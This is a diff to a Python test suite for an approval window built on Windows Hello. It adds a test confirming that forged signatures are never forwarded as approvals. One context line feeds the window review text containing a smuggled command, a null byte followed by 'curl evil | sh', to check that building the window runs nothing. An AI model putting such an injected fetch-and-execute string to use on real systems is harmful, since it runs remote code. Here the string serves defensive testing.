@@ -255,7 +255,8 @@ def test_approve_signs_the_challenge_and_only_approve_does(fake):
     none."""
     sig = base64.b64encode(REAL_SIGNATURE).decode()
     fake.plan(window={"status": "Success", "choice": "approve"},
-              sign={"status": "Success", "signature": sig})
+              sign={"status": "Success", "signature": sig},
+              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
     result = hello.open_window(_request())
     assert result == {"choice": "approve", "method": "hello", "cred_id": "collab-alice",
                       "signature_b64": sig}
@@ -400,3 +401,15 @@ def test_the_real_script_parses_and_its_window_builds_without_showing():
     assert b"errors=0" in out.stdout, out.stdout
     built = hello.build_window_only(_request(review_text="make test\x00; curl evil | sh"))
     assert built["choice"] == "built"
+
+
+def test_a_signature_that_does_not_verify_locally_is_never_an_approval(fake):
+    """The hub verifies every signature; the window checks too, against the
+    key's own public half (read without a prompt), so an answer this machine's
+    Hello did not make is never forwarded as an approval."""
+    forged = base64.b64encode(b"\x00" * 256).decode()
+    fake.plan(window={"status": "Success", "choice": "approve"},
+              sign={"status": "Success", "signature": forged},
+              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
+    assert hello.open_window(_request()) == {"choice": "unavailable",
+                                             "reason": "SignatureMismatch"}
